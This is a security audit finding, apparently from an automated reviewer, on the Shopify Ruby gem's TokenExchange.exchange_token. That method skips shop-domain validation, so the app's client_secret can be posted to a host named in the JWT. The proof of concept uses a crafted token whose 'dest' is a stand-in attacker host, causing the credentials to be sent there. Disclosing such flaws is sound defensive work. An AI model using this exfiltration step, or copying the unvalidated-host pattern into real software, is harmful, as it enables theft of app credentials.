### Title
`ShopifyAPI::Auth::TokenExchange.exchange_token` sends the app's `client_secret` to a shop host derived from an unvalidated JWT `dest` claim - ([File: lib/shopify_api/auth/token_exchange.rb])

### Summary
`TokenExchange.exchange_token` builds the token-exchange request host directly from the `dest` claim of a session token, without running it through `ShopifyAPI::Utils::ShopValidator.sanitize!`, unlike every sibling credential-bearing method in the same module/gem area (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`), which all call `Utils::ShopValidator.sanitize!(shop)` before constructing the request host.

### Finding Description
`JwtPayload#shop` simply strips `"https://"` off the raw `dest` claim with no domain allow-listing: [1](#0-0) 

`TokenExchange.exchange_token` takes that unsanitized value as `dest_shop`, builds a `Session` with it, and uses it as the host for a `Clients::HttpClient`, which sends the request to `https://#{session.shop}` carrying the app's `client_id`/`client_secret` in the POST body: [2](#0-1) [3](#0-2) 

Compare this to the other three credential-sending call sites in the same area of the gem, all of which sanitize the shop value with the allow-list validator before it is used to pick the destination host: [4](#0-3) [5](#0-4) [6](#0-5) 

The identity binding that should hold is: *the host that receives `client_secret` == a host verified to be an actual Shopify-controlled domain*. `JwtPayload` only verifies the JWT's HMAC signature and `aud` claim; it does not check that `dest` is one of `ShopifyAPI::Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS` (`myshopify.com`, `myshopify.io`, `shopify.com`, `spin.dev`, `shop.dev`): [7](#0-6) [8](#0-7) 

Since the JWT is HMAC-signed with the app's own `api_secret_key`/`old_api_secret_key`, this is not exploitable by a fully external, unauthenticated attacker who does not already possess a valid session token for the app — it requires a caller-supplied token whose `dest` was never intended to be trusted for host selection. However, within the gem's own contract, `dest` is explicitly documented as attacker-influenceable input in comparison to the other three sibling functions, which were hardened with `ShopValidator.sanitize!` specifically to close this class of host-confusion issue (see `CHANGELOG.md` note for `ShopValidator`). `exchange_token` was left out of that hardening pass.

### Impact Explanation
If a caller obtains or is given a syntactically-valid, correctly-signed session token whose `dest` claim does not resolve to a genuine `*.myshopify.com`/allow-listed host (e.g. a token issued for one embedded surface but replayed with a crafted `dest`, or a future signing-key confusion), `exchange_token` will POST the app's `client_id` and `client_secret` to that attacker-influenced host. This matches the "SSRF with the app's credentials" impact class: the app's `client_secret` is exfiltrated to a host that was never validated against the trusted-domain allow-list used everywhere else in the gem for this exact purpose.

### Likelihood Explanation
Low-to-Medium. Exploitation requires control over, or ability to influence, the `dest` claim of a token that still passes the app's own JWT signature/`aud` check — this is a higher bar than a fully anonymous request, but it is the exact bar the gem's authors chose to defend against for `client_credentials`, `refresh_access_token`, and `migrate_to_expiring_token` by adding `ShopValidator.sanitize!`. The asymmetry (three call sites protected, one not) indicates the omission in `exchange_token` is a gap in enforcement of the same threat model already recognized by the maintainers, rather than a deliberately accepted risk.

### Recommendation
In `TokenExchange.exchange_token` (`lib/shopify_api/auth/token_exchange.rb`), validate `dest_shop` with `Utils::ShopValidator.sanitize!(jwt_payload.shop)` (mirroring `migrate_to_expiring_token`, `client_credentials`, and `refresh_access_token`) before constructing `shop_session`/`Clients::HttpClient`, raising `Errors::InvalidShopError` for any `dest` that does not resolve to a trusted Shopify domain.

### Proof of Concept
1. Craft (or obtain) a session token that passes `JwtPayload` verification — i.e., signed with the app's `api_secret_key` (or `old_api_secret_key`) and with a correct `aud` — but whose `dest` claim is set to an attacker-controlled host, e.g. `dest: "https://attacker.example.com"`.
2. Call:
```ruby
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: crafted_token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
```
3. Observe `JwtPayload#shop` returns `"attacker.example.com"` unchanged [1](#0-0) , and `TokenExchange.exchange_token` builds `shop_session` from it and issues the POST containing `client_id`/`client_secret` to `https://attacker.example.com/admin/oauth/access_token` via `Clients::HttpClient` [9](#0-8) [10](#0-9) , unlike the sibling `migrate_to_expiring_token`, which would reject the same host via `ShopValidator.sanitize!` before making an equivalent request [11](#0-10) .
